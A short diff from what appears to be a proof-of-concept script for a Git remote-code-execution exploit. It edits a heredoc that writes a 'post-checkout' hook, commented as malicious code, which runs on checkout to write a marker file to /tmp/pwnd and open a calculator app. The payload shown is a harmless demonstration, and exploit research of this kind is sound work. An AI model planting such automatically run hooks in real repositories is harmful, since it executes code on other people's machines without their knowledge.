@@ -18,8 +18,9 @@ mkdir -p y/hooks
 # Write the malicious code to a hook
 cat > y/hooks/post-checkout <<EOF
 #!/bin/bash
-echo "amal_was_here" > /tmp/pwnd
-calc.exe
+echo "git rce" > /tmp/pwnd
+# wondows:calc.exe
+# mac:open -a Calculator.app
 open -a Calculator.app
 EOF
 
